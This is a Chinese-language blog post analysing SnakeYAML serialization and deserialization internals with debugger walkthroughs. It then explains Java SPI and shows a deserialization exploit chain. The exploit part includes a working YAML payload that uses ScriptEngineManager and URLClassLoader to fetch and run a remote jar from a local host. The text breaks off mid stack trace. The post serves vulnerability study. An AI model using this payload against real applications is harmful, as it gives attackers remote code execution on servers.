<h2 id="snakeYaml序列化-反序列化分析"><a href="#snakeYaml序列化-反序列化分析" class="headerlink" title="snakeYaml序列化&#x2F;反序列化分析"></a>snakeYaml序列化&#x2F;反序列化分析</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="demo演示"><a href="#demo演示" class="headerlink" title="demo演示"></a>demo演示</h3><p>SnakeYaml 提供了 <code>Yaml.dump()</code> 和 <code>Yaml.load()</code> 两个函数对 yaml 格式的数据进行序列化和反序列化。</p>
<ul>
<li>Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个 Java 对象；</li>
<li>Yaml.dump()：将一个对象转化为 yaml 文件形式；</li>
</ul>
<h4 id="定义-Java-类"><a href="#定义-Java-类" class="headerlink" title="定义 Java 类"></a>定义 Java 类</h4><p>定义一个简单的 Java 类来表示数据结构：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">protected</span> List&lt;String&gt; hobbies;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数被调用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getters and Setters</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName方法被调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge方法被调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getHobbies</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getHobbies方法被调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hobbies;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHobbies</span><span class="params">(List&lt;String&gt; hobbies)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setHobbies方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.hobbies = hobbies;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, hobbies=&quot;</span> + hobbies +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="序列化和反序列化示例"><a href="#序列化和反序列化示例" class="headerlink" title="序列化和反序列化示例"></a>序列化和反序列化示例</h4><p>编写一个示例程序来展示如何使用 <code>SnakeYAML</code> 进行序列化和反序列化：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.constructor.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYamlDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个 Person 对象</span></span><br><span class="line">        System.out.println(<span class="string">&quot;初始化一个Person 对象：&quot;</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setName(<span class="string">&quot;John Doe&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">30</span>);</span><br><span class="line">        person.setHobbies(Arrays.asList(<span class="string">&quot;reading&quot;</span>, <span class="string">&quot;hiking&quot;</span>, <span class="string">&quot;coding&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化：将 Java 对象转换为 YAML 字符串</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n序列化部分：&quot;</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlString</span> <span class="operator">=</span> yaml.dump(person);</span><br><span class="line">        System.out.println(<span class="string">&quot;Serialized YAML:\n&quot;</span> + yamlString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化：将 YAML 字符串转换回 Java 对象</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n反序列化部分：&quot;</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yamlLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>(<span class="keyword">new</span> <span class="title class_">Constructor</span>(Person.class));</span><br><span class="line">        <span class="type">Person</span> <span class="variable">loadedPerson</span> <span class="operator">=</span> yamlLoader.load(yamlString);</span><br><span class="line">        System.out.println(<span class="string">&quot;Deserialized Person:\n&quot;</span> + loadedPerson);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="运行示例"><a href="#运行示例" class="headerlink" title="运行示例"></a>运行示例</h4><p>运行上述代码，你将看到以下输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">初始化一个Person 对象：</span><br><span class="line">构造函数被调用</span><br><span class="line">setName方法被调用</span><br><span class="line">setAge方法被调用</span><br><span class="line">setHobbies方法被调用</span><br><span class="line"></span><br><span class="line">序列化部分：</span><br><span class="line">getAge方法被调用</span><br><span class="line">getHobbies方法被调用</span><br><span class="line">Serialized YAML:</span><br><span class="line">!!demo.Person</span><br><span class="line">age: 30</span><br><span class="line">hobbies: [reading, hiking, coding]</span><br><span class="line">name: John Doe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">反序列化部分：</span><br><span class="line">构造函数被调用</span><br><span class="line">setAge方法被调用</span><br><span class="line">setHobbies方法被调用</span><br><span class="line">Deserialized Person:</span><br><span class="line">Person&#123;name=&#x27;John Doe&#x27;, age=30, hobbies=[reading, hiking, coding]&#125;</span><br></pre></td></tr></table></figure>

<p>序列化的时候我们调用了<code>getAge</code>和<code>getHobbies</code>，反序列化的时候调用了<code>setAge</code>和<code>setHobbies</code>，但是，我们是有三个属性的。不难看出，序列化和反序列化的时候，我们并没有调用<code>public</code>修饰的<code>name</code>的getter&#x2F;setter函数。但是从结果看name确实成功被序列化和反序列化了。</p>
<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>可以直接跟到Yaml#dumpAll方法，其中我们要序列化的类在data变量里。data是我们要序列化的类的迭代器，output是一个 Writer，用于输出序列化后的 YAML 数据，rootTag是一个 Tag 对象，表示 YAML 文档的根标签。之后会new一个Serializer对象，里面放了一个 Emitter 对象，Emitter是一个用于将 YAML 事件发送到输出流的类，这里传入了output和 dumperOptions。对于每个对象，调用 <code>this.representer.represent(data.next())</code> 方法将其转换为 <code>Node</code> 对象。然后调用 <code>serializer.serialize(node)</code> 方法将 <code>Node</code> 对象序列化为 YAML 格式。</p>
<p><img src="https://cmisl.github.io/images/image-20240714005311620.png" alt="image-20240714005311620"></p>
<p>然后经过BaseRepresenter#represent来到BaseRepresenter#representData。传入的参数是data，此时这个data是我们从迭代器取出来的，就是我们要序列化的类。这个方法的主要目的是根据对象的类型选择合适的表示器（<code>Representer</code>），并将对象转换为 <code>Node</code> 对象。前面一堆判断主要是选取合适的表示器来转换对象。</p>
<p><img src="https://cmisl.github.io/images/image-20240714010237938.png" alt="image-20240714010237938"></p>
<p>最后找到了Representer$RepresentJavaBean这个表示器来处理我们的类，很合理，刚好我们的类就是一个JavaBean。</p>
<p><img src="https://cmisl.github.io/images/image-20240714010531474.png" alt="image-20240714010531474"></p>
<p>跟进去会看到，调用了Representer#representJavaBean方法，参数是通过<code>getProperties(data.getClass())</code> 方法获取的 <code>data</code> 对象的类类型（<code>data.getClass()</code>）的属性列表。这个方法返回一个 <code>Property</code> 对象的TreeSet类型集合(更好的TreeMap集合)。这里会涉及到为什么public属性不会调用getter&#x2F;setter方法，后续会提到。</p>
<p><img src="https://cmisl.github.io/images/image-20240714011241208.png" alt="image-20240714011241208"></p>
<p>这段代码是用于将一个 JavaBean 对象转换为一个 <code>MappingNode</code> 对象。它遍历 JavaBean 的属性集合，也就是properties，然后会通过集合中每个property的get方法获得属性的值，然后调用representJavaBeanProperty方法，将属性的名称和值分别表示为 <code>ScalarNode</code> 和 <code>Node</code>，并返回一个 NodeTuple。在为每个属性生成一个 <code>NodeTuple</code>后，会将这些 <code>NodeTuple</code> 添加到 <code>MappingNode</code> 中，也就是转化后的Node。</p>
<p><img src="https://cmisl.github.io/images/image-20240714011848524.png" alt="image-20240714011848524"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">representJavaBean:99, Representer (org.yaml.snakeyaml.representer)</span><br><span class="line">representData:80, Representer$RepresentJavaBean (org.yaml.snakeyaml.representer)</span><br><span class="line">representData:106, BaseRepresenter (org.yaml.snakeyaml.representer)</span><br><span class="line">represent:65, BaseRepresenter (org.yaml.snakeyaml.representer)</span><br><span class="line">dumpAll:275, Yaml (org.yaml.snakeyaml)</span><br><span class="line">dumpAll:243, Yaml (org.yaml.snakeyaml)</span><br><span class="line">dump:220, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:23, Test (demo)</span><br></pre></td></tr></table></figure>

<p>serialize里面就是处理我们转化好的node类了。</p>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>进入Yaml#load，会new一个StreamReader类，把我们需要反序列化的yaml数据赋值进去，方便数据流的拂去，然后进入Yaml#loadFromReader函数</p>
<p><img src="https://cmisl.github.io/images/image-20240714030158485.png" alt="image-20240714030158485"></p>
<p>Yaml#loadFromReader函数中，我们会将sreader作为ParserImpl对象的一部分，然后将这个ParserImpl对象又作为一部分赋值给Composer。然后调用BaseConstructor#getSingleData。</p>
<p><img src="https://cmisl.github.io/images/image-20240714031036315.png" alt="image-20240714031036315"></p>
<p>接着进入BaseConstructor#getSingleData，其中composer在上一步会被设置了我们new出来的Composer对象，我们的yaml数据就在其中，而函数的参数，是Object.class。然后，会调用composer的getSingleNode函数根据我们的yaml数据，构造出node。node的value是我们要反序列化的类的属性对应的nodeTuple的数组列表。每个nodeTuple的keyNode是反序列化的类的属性名称封装的node，valueNode则是属性值封装的node。</p>
<p><img src="https://cmisl.github.io/images/image-20240714031012983.png" alt="image-20240714031012983"></p>
<p>接着我们会将node作为参数，调用BaseConstructor#constructDocument，这个方法看名字应该是从给定的node构造出一个文档对象。而这个方法又会调用BaseConstructor#constructObject，从给定的node构造出一个对象。当前方法从node中构造出对象后，会调用fillRecursive方法。这个步骤可能是为了处理那些在初始构造过程中因为递归引用或其他原因而不能立即完成构造的对象。</p>
<p><img src="https://cmisl.github.io/images/image-20240714032329675.png" alt="image-20240714032329675"></p>
<p>进入BaseConstructor#constructObject后，首先检查 constructedObjects 映射中是否已经包含了一个以该 node 为键的条目。constructedObjects 是一个映射，用于存储已经构造的对象，以节点为键，构造出的对象为值。如果 constructedObjects 包含该 node，则直接从映射中返回已构造的对象，避免了重复构造的开销。如果 constructedObjects 不包含该 node，则调用 this.constructObjectNoCheck(node) 方法来构造对象。这里因为没有构造过我们可以直接进入 BaseConstructorconstructObjectNoCheck(node) 方法。</p>
<p><img src="https://cmisl.github.io/images/image-20240714033322774.png" alt="image-20240714033322774"></p>
<p>BaseConstructorconstructObjectNoCheck中，我们会先把node添加到recursiveObject中，然后获得一个construct，接着判断constructedObjects包含node，依然是没有的，我们调用Construct$ConstructYamlObject#construct函数，node作为参数</p>
<p><img src="https://cmisl.github.io/images/image-20240714033249467.png" alt="image-20240714033249467"></p>
<p>在这个函数中又会去调用Construct$ConstructMapping#construct。为什么是ConstructMapping的construct，可以跟进this.getConstructor(node)里。<img src="https://cmisl.github.io/images/image-20240714033821771.png" alt="image-20240714033821771"></p>
<p>实例化出我们需要的类，然后调用Construct#constructJavaBean2ndStep方法用property.set里面给属性赋值。</p>
<p><img src="https://cmisl.github.io/images/image-20240714035048854.png" alt="image-20240714035048854"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">set:73, MethodProperty (org.yaml.snakeyaml.introspector)</span><br><span class="line">constructJavaBean2ndStep:285, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:171, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:331, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:229, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:219, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:173, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:157, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:490, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:416, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:32, Test (demo)</span><br></pre></td></tr></table></figure>

<h4 id="public相关问题"><a href="#public相关问题" class="headerlink" title="public相关问题"></a>public相关问题</h4><p>关于为什么不会调用<code>public</code>修饰的<code>name</code>的getter&#x2F;setter函数。从序列化的角度分析，我们序列化会获取properties里面的每个property，也就是properties集合每个key对应的val值（后续其实是key值了，处理成了TreeMap集合，类似树这个结构。），这个值在设置的时候。一开始，每个key，也就是属性名，对应的val都是MethodProperty类型。</p>
<p><img src="https://cmisl.github.io/images/image-20240713233331321.png" alt="image-20240713233331321"></p>
<p>但是在后续处理的时候，会判断每个属性是什么修饰，如果是public修饰的话，就会将这个属性的Property设置为FieldProperty。</p>
<p><img src="https://cmisl.github.io/images/image-20240713232632520.png" alt="image-20240713232632520"></p>
<p>那么序列化后续部分，代码会去得到每个Property，然后调用其get方法来获取我们要序列化的类的属性的值，而MethodProperty和FieldProperty的get方法也是不一样的。</p>
<p><img src="https://cmisl.github.io/images/image-20240713233819941.png" alt="image-20240713233819941"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">MethodProperty#get</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.property.getReadMethod().setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.property.getReadMethod().invoke(object);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(<span class="string">&quot;Unable to find getter for property &#x27;&quot;</span> + <span class="built_in">this</span>.property.getName() + <span class="string">&quot;&#x27; on object &quot;</span> + object + <span class="string">&quot;:&quot;</span> + var3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">FieldProperty#get</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.field.get(object);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(<span class="string">&quot;Unable to access field &quot;</span> + <span class="built_in">this</span>.field.getName() + <span class="string">&quot; on object &quot;</span> + object + <span class="string">&quot; : &quot;</span> + var3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对比两个get方法，显然MethodProperty#get方法，是通过反射获取属性的getter方法，然后method.invoke调用。而FieldProperty#get，则是该属性的字段field，然后用field.get方法获取属性的值。</p>
<h2 id="前置知识-SPI机制"><a href="#前置知识-SPI机制" class="headerlink" title="前置知识-SPI机制"></a>前置知识-SPI机制</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>SPI，即Service Provider Interface，是Java提供的一套用来被第三方实现或扩展的API。它可以用于模块化，提供统一的接口，并且加载实现这些接口的类。</p>
<p>SPI的工作原理很简单。在你的JAR包中，可以包含一个名为<code>META-INF/services</code>的文件夹，里面包含一些配置文件。这些配置文件的命名应该和你的接口全名一致，而文件的内容则是该接口的具体实现类。当运行到程序需要用到这个接口的时候，Java会扫描所有包含这个接口的实现类的配置文件，加载实现类。</p>
<p>一个典型的SPI的使用是在<code>java.util.ServiceLoader</code>。ServiceLoader是一种服务提供加载设施，它可以加载Service接口的实现。当你调用<code>ServiceLoader.load()</code>方法时，它会返回一个实现了该接口的对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ServiceLoader&lt;YourInterface&gt; loaders = ServiceLoader.load(YourInterface.class);</span><br><span class="line"><span class="keyword">for</span> (YourInterface loader : loaders) &#123;</span><br><span class="line">    <span class="comment">// do something with loader</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，你就可以在代码中调用SPI的接口，而具体的实现可以在运行时动态添加。这种机制让你的代码可以更加模块化，更容易扩展。</p>
<p>Java的许多核心API都使用SPI，例如<code>java.sql.Driver</code>或<code>javax.servlet.ServletContainerInitializer</code>等。你可以通过实现这些接口，为Java添加新的数据库驱动或者Servlet容器。</p>
<h3 id="mysql-connector-java中的SPI"><a href="#mysql-connector-java中的SPI" class="headerlink" title="mysql-connector-java中的SPI"></a>mysql-connector-java中的SPI</h3><p><img src="https://cmisl.github.io/images/image-20240714143632407.png" alt="image-20240714143632407"></p>
<p>程序会通过 <code>java.util.ServiceLoder</code> 动态装载实现模块，在 <code>META-INF/services</code> 目录下的配置文件寻找实现类的类名，通过 <code>Class.forName</code> 加载进来， <code>newInstance()</code> 反射创建对象。</p>
<h2 id="snakeYaml反序列化漏洞"><a href="#snakeYaml反序列化漏洞" class="headerlink" title="snakeYaml反序列化漏洞"></a>snakeYaml反序列化漏洞</h2><h3 id="基于-ScriptEngineManager-利用链（利用-SPI-机制）"><a href="#基于-ScriptEngineManager-利用链（利用-SPI-机制）" class="headerlink" title="基于 ScriptEngineManager 利用链（利用 SPI 机制）"></a>基于 ScriptEngineManager 利用链（利用 SPI 机制）</h3><p><a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload/">yaml-payload.jar配置</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SPInScriptEngineManager_EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager &quot;</span> +</span><br><span class="line">                <span class="string">&quot;[!!java.net.URLClassLoader &quot;</span> +</span><br><span class="line">                <span class="string">&quot;[[!!java.net.URL [\&quot;http://localhost:9999/yaml-payload.jar\&quot;]]]]\n&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问到jar包时，会扫描META-INF&#x2F;services下的文件，扫到javax.script.ScriptEngineFactory，会创造这个接口的具体实现类，这个具体实现类就是artsploit.AwesomeScriptEngineFactory，也就是我们构造的恶意类。</p>
<p><img src="https://cmisl.github.io/images/image-20240714151124540.png" alt="image-20240714151124540"></p>
<p>因为在实例化这个类的时候会通过 <code>Class.forName</code> 加载进来， <code>newInstance()</code> 反射创建对象，所以可以调用我们的构造函数触发calc指令。</p>
<p><img src="https://cmisl.github.io/images/image-20240714151319527.png" alt="image-20240714151319527"></p>
<h4 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h4><p>来到Constructor#Construct函数，此时的getConstructor(node)是Constructor$ConstructSequence，也就是说我们接下来会去到Constructor$ConstructSequence#construct函数，此时的node是SequenceNode类型，代表一个序列，即一个元素列表。我们的yaml数据就封装在里面</p>
<p><img src="https://cmisl.github.io/images/image-20240714160911569.png" alt="image-20240714160911569"></p>
<p><img src="https://cmisl.github.io/images/image-20240714161249195.png" alt="image-20240714161249195"></p>
<p>进入Constructor$ConstructSequence#construct函数后，前面一些if判断跳过，来到会执行的代码处，首先遍历目标类的所有声明的构造函数，并将那些参数数量与序列节点中的元素数量匹配的构造函数添加到一个列表中。如果只有一个可能的构造函数，这段代码会创建一个参数列表，并为每个参数节点设置运行时类型，然后调用这个构造函数来创建一个新的对象。而我们possibleConstructors确实只有一个Construct，所以会进入到这个逻辑。</p>
<p><img src="https://cmisl.github.io/images/image-20240714161639661.png" alt="image-20240714161639661"></p>
<p>中间会有循环调用，我们的yaml数据封装太多层了。</p>
<p><img src="https://cmisl.github.io/images/image-20240714164120687.png" alt="image-20240714164120687"></p>
<p>然后回反射调用构造函数来构造我们的ScriptEngineManager对象。</p>
<p><img src="https://cmisl.github.io/images/image-20240714164721780.png" alt="image-20240714164721780"></p>
<p>来到ScriptEngineManager对象构造函数，</p>
<p><img src="https://cmisl.github.io/images/image-20240714164405745.png" alt="image-20240714164405745"></p>
<p>会走到ScriptEngineManager#initEngines方法，该方法被设计为使用提供的ClassLoader初始化ScriptEngineFactory实例。我们这里就是UrlClassLoader，然后会用迭代器去遍历。在这个过程中，会检查和加载配置文件中定义的服务，并逐个解析这些服务，也就是扫描META-INF&#x2F;services文件夹，然后反射获取接口的实现类，newInstance实例化。实例化的过程中调用了这个实现类的构造函数触发指令。</p>
<p><img src="https://cmisl.github.io/images/image-20240714170634643.png" alt="image-20240714170634643"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">newInstance:<span class="number">396</span>, Class (java.lang)</span><br><span class="line">nextService:<span class="number">380</span>, ServiceLoader$LazyIterator (java.util)</span><br><span class="line">next:<span class="number">404</span>, ServiceLoader$LazyIterator (java.util)</span><br><span class="line">next:<span class="number">480</span>, ServiceLoader$<span class="number">1</span> (java.util)</span><br><span class="line">initEngines:<span class="number">122</span>, ScriptEngineManager 